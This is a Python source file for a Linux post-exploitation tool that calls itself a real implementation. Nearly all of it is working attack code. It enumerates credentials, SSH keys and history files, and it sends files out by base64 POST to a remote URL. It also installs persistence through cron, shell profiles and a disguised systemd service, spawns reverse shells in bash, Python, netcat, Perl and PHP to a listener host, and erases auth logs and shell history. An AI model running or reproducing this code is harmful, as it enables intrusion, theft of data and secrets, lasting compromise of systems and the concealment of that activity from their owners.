#!/usr/bin/env python3
"""
Post-Exploitation Command Execution Tool
Real implementation for Linux post-exploitation activities
"""

import subprocess
import os
import sys
import shlex
import pty
import select
import signal
import threading
import queue
import base64
import socket
from datetime import datetime

class PostExploitTool:
    def __init__(self, log_file=None):
        self.log_file = log_file
        self.command_history = []
        self.output_queue = queue.Queue()
        
    def log(self, message):
        """Log messages with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        print(log_entry)
        if self.log_file:
            with open(self.log_file, 'a') as f:
                f.write(log_entry + '\n')
    
    def execute_command(self, command, timeout=30, capture_output=True):
        """Execute a shell command and return the result"""
        self.log(f"Executing: {command}")
        self.command_history.append(command)
        
        try:
            if capture_output:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=timeout
                )
                output = result.stdout
                error = result.stderr
                returncode = result.returncode
                
                if output:
                    self.log(f"Output: {output[:500]}{'...' if len(output) > 500 else ''}")
                if error:
                    self.log(f"Error: {error[:500]}{'...' if len(error) > 500 else ''}")
                    
                return {
                    'success': returncode == 0,
                    'output': output,
                    'error': error,
                    'returncode': returncode
                }
            else:
                # Execute without capturing (for interactive commands)
                returncode = os.system(command)
                return {
                    'success': returncode == 0,
                    'output': '',
                    'error': '',
                    'returncode': returncode
                }
                
        except subprocess.TimeoutExpired:
            self.log(f"Command timed out after {timeout}s")
            return {
                'success': False,
                'output': '',
                'error': f'Command timed out after {timeout} seconds',
                'returncode': -1
            }
        except Exception as e:
            self.log(f"Error executing command: {e}")
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'returncode': -1
            }
    
    def execute_background(self, command):
        """Execute command in background, returns PID"""
        self.log(f"Executing in background: {command}")
        try:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                start_new_session=True
            )
            self.log(f"Background process started with PID: {process.pid}")
            return process.pid
        except Exception as e:
            self.log(f"Error starting background process: {e}")
            return None
    
    def execute_with_pty(self, command):
        """Execute command with pseudo-terminal (for interactive commands)"""
        self.log(f"Executing with PTY: {command}")
        try:
            master, slave = pty.openpty()
            process = subprocess.Popen(
                command,
                shell=True,
                stdin=slave,
                stdout=slave,
                stderr=slave,
                close_fds=True
            )
            os.close(slave)
            
            output = b''
            while True:
                r, w, e = select.select([master], [], [], 1)
                if r:
                    try:
                        data = os.read(master, 1024)
                        if data:
                            output += data
                        else:
                            break
                    except OSError:
                        break
                if process.poll() is not None:
                    break
            
            os.close(master)
            return {
                'success': process.returncode == 0,
                'output': output.decode('utf-8', errors='replace'),
                'error': '',
                'returncode': process.returncode
            }
        except Exception as e:
            self.log(f"PTY execution error: {e}")
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'returncode': -1
            }
    
    def gather_system_info(self):
        """Gather comprehensive system information"""
        self.log("Gathering system information...")
        info = {}
        
        commands = {
            'hostname': 'hostname',
            'kernel': 'uname -a',
            'os_release': 'cat /etc/os-release 2>/dev/null || cat /etc/*-release 2>/dev/null',
            'cpu': 'cat /proc/cpuinfo | grep "model name" | head -1',
            'memory': 'free -h',
            'disk': 'df -h',
            'users': 'cat /etc/passwd',
            'groups': 'cat /etc/group',
            'network_interfaces': 'ip addr 2>/dev/null || ifconfig',
            'routing_table': 'ip route 2>/dev/null || route -n',
            'arp_cache': 'ip neigh 2>/dev/null || arp -a',
            'listening_ports': 'ss -tlnp 2>/dev/null || netstat -tlnp',
            'established_connections': 'ss -tnp 2>/dev/null || netstat -tnp',
            'processes': 'ps aux',
            'cron_jobs': 'cat /etc/crontab 2>/dev/null; ls -la /etc/cron.* 2>/dev/null',
            'sudo_permissions': 'sudo -l 2>/dev/null',
            'suid_files': 'find / -perm -4000 -type f 2>/dev/null | head -50',
            'writable_dirs': 'find / -writable -type d 2>/dev/null | head -50',
            'ssh_keys': 'find /home -name "id_rsa*" -o -name "authorized_keys" 2>/dev/null',
            'history_files': 'find /home -name ".*history" 2>/dev/null',
            'environment': 'env',
            'current_user': 'id',
            'logged_in_users': 'w',
            'last_logins': 'last -20'
        }
        
        for key, cmd in commands.items():
            result = self.execute_command(cmd, timeout=10)
            info[key] = result['output'] if result['success'] else result['error']
        
        return info
    
    def download_file(self, url, output_path):
        """Download a file from URL"""
        methods = [
            f'curl -o {output_path} {url}',
            f'wget -O {output_path} {url}',
            f'python3 -c "import urllib.request; urllib.request.urlretrieve(\'{url}\', \'{output_path}\')"'
        ]
        
        for method in methods:
            result = self.execute_command(method, timeout=60)
            if result['success'] and os.path.exists(output_path):
                self.log(f"Downloaded successfully: {output_path}")
                return True
        
        self.log(f"Failed to download: {url}")
        return False
    
    def upload_file(self, file_path, remote_url):
        """Upload a file to remote server"""
        if not os.path.exists(file_path):
            self.log(f"File not found: {file_path}")
            return False
        
        # Base64 encode and send via curl
        with open(file_path, 'rb') as f:
            data = base64.b64encode(f.read()).decode()
        
        result = self.execute_command(
            f'curl -X POST -d "data={data}&filename={os.path.basename(file_path)}" {remote_url}',
            timeout=60
        )
        return result['success']
    
    def create_persistence(self, method='cron', payload_cmd=''):
        """Create persistence mechanism"""
        self.log(f"Creating persistence via {method}")
        
        if method == 'cron':
            # Add to user crontab
            result = self.execute_command(
                f'(crontab -l 2>/dev/null; echo "*/5 * * * * {payload_cmd}") | crontab -'
            )
        elif method == 'bashrc':
            # Add to .bashrc
            result = self.execute_command(
                f'echo "{payload_cmd} &" >> ~/.bashrc'
            )
        elif method == 'profile':
            # Add to .profile
            result = self.execute_command(
                f'echo "{payload_cmd} &" >> ~/.profile'
            )
        elif method == 'systemd':
            # Create systemd service (requires root)
            service_content = f'''[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "{payload_cmd}"
Restart=always

[Install]
WantedBy=multi-user.target'''
            
            self.execute_command(f'echo "{service_content}" > /tmp/.sys_service')
            result = self.execute_command(
                'sudo mv /tmp/.sys_service /etc/systemd/system/sys_service.service && '
                'sudo systemctl daemon-reload && sudo systemctl enable sys_service'
            )
        else:
            self.log(f"Unknown persistence method: {method}")
            return False
        
        return result['success']
    
    def reverse_shell(self, lhost, lport, shell_type='bash'):
        """Spawn a reverse shell"""
        shells = {
            'bash': f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
            'python': f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
            'nc': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
            'perl': f'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
            'php': f'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\''
        }
        
        if shell_type not in shells:
            self.log(f"Unknown shell type: {shell_type}")
            return False
        
        self.log(f"Spawning {shell_type} reverse shell to {lhost}:{lport}")
        return self.execute_background(shells[shell_type])
    
    def cleanup(self):
        """Clean up traces"""
        self.log("Cleaning up traces...")
        cleanup_commands = [
            'history -c',
            'rm -f ~/.bash_history',
            'rm -f /var/log/auth.log',
            'rm -f /var/log/secure',
            'unset HISTFILE',
            'export HISTSIZE=0'
        ]
        
        for cmd in cleanup_commands:
            self.execute_command(cmd, timeout=5)
        
        self.log("Cleanup complete")


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Post-Exploitation Tool")
    subparsers = parser.add_subparsers(dest='command', required=True)
    
    # Execute command
    exec_parser = subparsers.add_parser('exec', help='Execute a command')
    exec_parser.add_argument('cmd', help='Command to execute')
    exec_parser.add_argument('--timeout', type=int, default=30, help='Timeout in seconds')
    exec_parser.add_argument('--background', action='store_true', help='Run in background')
    
    # System info
    subparsers.add_parser('sysinfo', help='Gather system information')
    
    # Download file
    dl_parser = subparsers.add_parser('download', help='Download a file')
    dl_parser.add_argument('url', help='URL to download')
    dl_parser.add_argument('output', help='Output path')
    
    # Reverse shell
    shell_parser = subparsers.add_parser('shell', help='Spawn reverse shell')
    shell_parser.add_argument('lhost', help='Listener IP')
    shell_parser.add_argument('lport', type=int, help='Listener port')
    shell_parser.add_argument('--type', choices=['bash', 'python', 'nc', 'perl', 'php'], default='bash')
    
    # Persistence
    persist_parser = subparsers.add_parser('persist', help='Create persistence')
    persist_parser.add_argument('--method', choices=['cron', 'bashrc', 'profile', 'systemd'], default='cron')
    persist_parser.add_argument('--payload', required=True, help='Payload command')
    
    # Cleanup
    subparsers.add_parser('cleanup', help='Clean up traces')
    
    args = parser.parse_args()
    tool = PostExploitTool()
    
    if args.command == 'exec':
        if args.background:
            pid = tool.execute_background(args.cmd)
            print(f"Process started with PID: {pid}")
        else:
            result = tool.execute_command(args.cmd, timeout=args.timeout)
            print(result['output'])
            if result['error']:
                print(f"Error: {result['error']}", file=sys.stderr)
            sys.exit(0 if result['success'] else 1)
    
    elif args.command == 'sysinfo':
        info = tool.gather_system_info()
        for key, value in info.items():
            print(f"\n=== {key.upper()} ===")
            print(value)
    
    elif args.command == 'download':
        success = tool.download_file(args.url, args.output)
        sys.exit(0 if success else 1)
    
    elif args.command == 'shell':
        pid = tool.reverse_shell(args.lhost, args.lport, args.type)
        if pid:
            print(f"Reverse shell spawned with PID: {pid}")
    
    elif args.command == 'persist':
        success = tool.create_persistence(args.method, args.payload)
        print("Persistence created" if success else "Failed to create persistence")
        sys.exit(0 if success else 1)
    
    elif args.command == 'cleanup':
        tool.cleanup()


if __name__ == "__main__":
    main()
